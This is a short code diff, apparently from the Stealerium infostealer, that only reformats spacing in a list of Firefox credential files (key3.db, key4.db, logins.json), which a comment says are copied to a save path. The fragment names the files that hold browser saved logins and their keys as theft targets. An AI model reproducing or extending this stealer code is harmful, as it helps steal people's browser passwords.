@@ -6,7 +6,7 @@ namespace Stealerium.Target.Browsers.Firefox
 {
     internal sealed class CLogins
     {
-        private static readonly string[] KeyFiles = {"key3.db", "key4.db", "logins.json"};
+        private static readonly string[] KeyFiles = { "key3.db", "key4.db", "logins.json" };
 
         // Copy key3.db, key4.db, logins.json if exists
         private static void CopyDatabaseFile(string from, string sSavePath)
